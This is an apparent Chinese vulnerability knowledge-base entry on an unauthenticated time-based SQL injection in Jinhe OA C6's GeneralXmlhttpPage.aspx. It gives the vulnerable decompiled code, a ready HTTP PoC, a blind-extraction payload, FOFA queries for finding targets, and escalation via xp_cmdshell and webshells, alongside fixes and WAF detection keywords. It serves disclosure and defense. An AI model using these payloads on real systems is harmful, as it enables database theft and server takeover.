---
id: web-generic-sqli-jhsoft-generalxmlhttppage-appraiseid-time-sqli
title: 金和 OA C6 GeneralXmlhttpPage.aspx CheckAppraiseState 的 id 直拼 SQL：MSSQL WAITFOR 时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: jhsoft-generalxmlhttppage-appraiseid-time-sqli
aliases:
- 金和OA SQL注入
- GeneralXmlhttpPage.aspx
- CheckAppraiseState
- AppraiseID 注入
- JHSoft.Web.Appraise
- 金和 OA C6 SQLi
- WAITFOR DELAY 盲注
tags:
- web
- sqli
- mssql
- time-based
- dotnet
- jhsoft
- csharp
- dnspy
cve: []
severity: high
confidence: high
affected_versions: 金和 OA C6 v3.8 之前
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:28:34+08:00'
  notes: 已对照原文核对：dnSpy 反编译 CheckAppraiseState 的 string.Format 拼接与 ExecSQLReDataTable、type=CheckAppraiseState&id=1';WAITFOR DELAY '0:0:5'-- 的 Burp 请求与 5260ms 响应（IIS/7.5、ASP.NET 4.0.30319）截图均一致；受影响版本 v3.8 之前与原文一致。未验证点：原文仅做时间盲注验证，未实际导出数据或验证 xp_cmdshell。dup 候选为同产品其他注入点（不同文件/参数），非同一链。
---

## 一句话结论

金和 OA C6 的 `GeneralXmlhttpPage.aspx` 在 `type=CheckAppraiseState` 分支中把 QueryString 参数 `id` 直接 `string.Format` 拼进 `select AppraiseOverFlag from appraise where AppraiseID = '{0}'`，没有任何过滤或参数化，后端为 MSSQL 时可用 `1';WAITFOR DELAY '0:0:5'--` 做时间盲注，进而读取数据库中的管理员密码/用户信息，高权限下还可能写入木马获取服务器权限。

## 原理

- 入口：`/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=<payload>`。`type` 选择 `CheckAppraiseState()` 方法。
- 代码（dnSpy 反编译 `JHSoft.Web.Appraise.dll` 的 `JHSoft.Web.Appraise.GeneralXmlhttpPage`）：
  ```csharp
  string arg = string.Empty;
  if (base.Request.QueryString["id"] != null) {
      arg = base.Request.QueryString["id"].ToString();
  }
  string queryString = string.Format("select AppraiseOverFlag from appraise where AppraiseID = '{0}'", arg);
  DataTable dataTable = this.db.ExecSQLReDataTable(queryString);
  ```
- `string.Format` 只是字符串拼接/格式化，不做任何 SQL 转义、类型转换或白名单校验；`id` 被原样放进单引号内，注入点成立。
- 数据库为 MSSQL（PoC 使用 `WAITFOR DELAY` 生效，响应时间从 0ms 变为 5260ms）；`ExecSQLReDataTable` 直接执行拼好的 SQL，未使用参数化命令。
- 可注入位置在 `AppraiseID = '{0}'` 的单引号内；闭合单引号后可用 `;` 堆叠或 `AND`/`OR` 布尔、时间盲注。文章 PoC 用分号 + `WAITFOR DELAY` 验证。
- 危害：读取 `appraise` 及同库其他表（管理员后台密码、站点用户个人信息）；高权限数据库账户下可 `xp_cmdshell`/写入文件等，进一步获取服务器权限。

## 触发条件

- 目标运行金和 OA C6 v3.8 之前版本，暴露 `/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx`。
- 后端数据库为 MSSQL（`WAITFOR DELAY`、`WAITFOR TIME` 等可用）；若为其他数据库需换对应延时语法。
- 无需认证即可访问该 aspx（文章复现未携带有效会话）。
- 可用 FOFA 语法 `app="金和网络-金和OA"` 做资产测绘。

## 利用步骤

1. 资产测绘：FOFA `app="金和网络-金和OA"` 找目标，确认 `/C6/` 路径可访问。
2. 定位代码：dnSpy 载入 `JHSoft.Web.Appraise.dll`，在 `JHSoft.Web.Appraise` 命名空间找 `GeneralXmlhttpPage`，查看 `CheckAppraiseState()`；注意不要进 `.ctor`，可用全局搜索 `GeneralXmlhttpPage` 选择 `CheckAppraiseState`。
3. 验证注入：请求 `?type=CheckAppraiseState&id=1'` 观察报错/异常；再发 `id=1';WAITFOR DELAY '0:0:5'--`，比较响应时间。
4. 时间盲注提取：用 `IF (条件) WAITFOR DELAY '0:0:5'--` 逐字符判断管理员密码哈希、表名、列名等；或用 sqlmap 指定 `--technique=T --dbms=mssql`。
5. 高权限利用：确认数据库账户权限后，尝试 `xp_cmdshell`、`sp_OACreate`、写入 WebShell 等（视权限与配置而定）。

## PoC

```http
GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```

响应约 5 秒（原文截图从 0ms 变为 5260ms），证明 `WAITFOR DELAY` 被执行：

```text
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: text/html
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
```

盲注数据提取示例（按需替换条件）：

```sql
1'; IF (SELECT COUNT(*) FROM sys.sql_logins WHERE name='sa')>0 WAITFOR DELAY '0:0:5'--
```

## 变体与关联

- 同产品其他 SQL 注入点：[[web-generic-sqli-jhsoft-homeservice-getuserinfo-getusersex]]（HomeService.asmx GetHomeInfo 的 userID 经 GetUserSex 直拼）、[[web-generic-sqli-jhsoft-tasktreejson-id-concat]]（TaskTreeJSON.aspx 的 id）、[[web-generic-sqli-jhsoft-incentiveplan-fulfill-incentiveid-version]]（IncentivePlanFulfill.aspx 的 IncentiveID/TVersion）、[[web-generic-sqli-jhsoft-addressimportpub-xml-node-concat]]（AddressImportPub.aspx XML 节点值拼 INSERT）。
- 变体要点：`type` 参数还可选择其他方法（同文件/同 DLL 中多个 `Check*`、`Get*` 方法），可继续审计其他分支是否有同类拼接。
- 关联：金和 OA 其他文件类漏洞见 [[web-generic-file-upload-jhsoft-uploadfileeditorsave-path-traversal-asp]]、[[web-generic-file-inclusion-jhsoft-uploadfiledownloadnew-fcform-traversal]]、[[web-generic-file-inclusion-jhsoft-downloadbgimage-path-read]]。

## 检测与防御

- 代码修复：`id` 只接受整数/白名单；使用参数化查询（`SqlCommand.Parameters`）或 ORM 参数绑定；禁止用 `string.Format` 拼接 SQL；`ExecSQLReDataTable` 内部也应强制参数化。
- 数据库最小权限：Web 应用账户不要有 `xp_cmdshell`、`sp_OACreate`、文件写入等高权限；关闭不必要的扩展存储过程。
- 部署与监测：限制 `/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx` 的外网访问；WAF 检测 `WAITFOR`、`SLEEP`、`pg_sleep`、`;--`、单引号闭合等特征；对响应时间异常（5 秒级）和 SQL 错误做告警。
- 版本升级：升级到金和 OA C6 v3.8 及以上（以厂商公告为准），并排查同 DLL 其他 `GeneralXmlhttpPage` 分支的拼接点。
